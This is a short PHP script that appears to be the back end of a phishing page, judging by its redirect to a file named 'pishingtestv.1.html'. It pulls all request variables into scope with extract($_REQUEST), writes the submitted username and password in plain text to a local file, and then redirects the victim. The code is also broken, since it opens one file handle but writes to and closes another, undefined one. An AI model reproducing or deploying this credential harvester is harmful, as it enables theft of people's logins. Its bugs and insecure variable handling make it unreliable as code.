<?php
    extract($_REQUEST);
    $data_file = fopen("form-save.txt","w");

    fwrite($file,"name :");
    fwrite($file, $uname ."\n");
    
    fwrite($file,"Password :");
    fwrite($file, $psw ."\n");
    fclose($file);
    header("location: pishingtestv.1.html");
 ?>
